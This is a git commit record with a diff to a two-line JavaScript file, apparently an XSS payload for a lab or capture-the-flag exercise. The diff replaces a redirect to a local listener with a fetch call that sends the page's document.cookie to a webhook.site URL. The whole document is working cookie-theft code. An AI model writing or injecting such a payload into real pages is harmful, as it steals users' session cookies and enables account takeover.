b59f2869c75a5f14cd64de593dcb935f8e19ff4f
wldldlq <smjy01@gmail.com>
2024-09-27 16:42:14 +0900

    Update a.js

--- a.js
+++ a.js
@@ -1,2 +1,5 @@
 var cookieValue = document.cookie;
-location.href = "http://127.0.0.1:8080/?q=" + encodeURIComponent(cookieValue);
+fetch("	https://webhook.site/25357a8b-bbbb-4773-a9c4-c2e64b5e2b06?q=" + encodeURIComponent(cookieValue), {
+    method: 'GET',
+    mode: 'no-cors'
+});
